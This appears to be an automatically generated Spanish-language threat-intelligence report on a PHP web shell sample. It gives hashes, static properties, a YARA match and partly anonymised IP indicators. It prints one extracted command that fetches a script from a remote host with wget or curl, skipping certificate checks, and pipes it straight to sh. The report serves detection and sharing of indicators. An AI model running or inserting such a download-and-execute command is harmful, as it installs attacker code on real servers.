# 🧬 Payload Analysis

`fdb4174fe4c96b39c1ed24fcaa14b1742c413c8535a489d27fef5ed21648e8cb`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se registró 1 detección YARA válida. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Web shell`
- **Familia:** `webshell`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:25:57+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `fdb4174fe4c96b39c1ed24fcaa14b1742c413c8535a489d27fef5ed21648e8cb`
- **MD5:** `795adbf6b97b1afee80453b6162c074e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (324), with CRLF line terminators |
| Tamaño | 1.8 KiB |
| Entropía | 5.8 |
| Strings | 33 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- YARA match: webshell

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.164.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| hash | fdb4174fe4c96b39c1ed24fcaa14b1742c413c8535a489d27fef5ed21648e8cb | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| ip | 103.96.147.XXX | artifact_source |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_PHP_Webshell |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
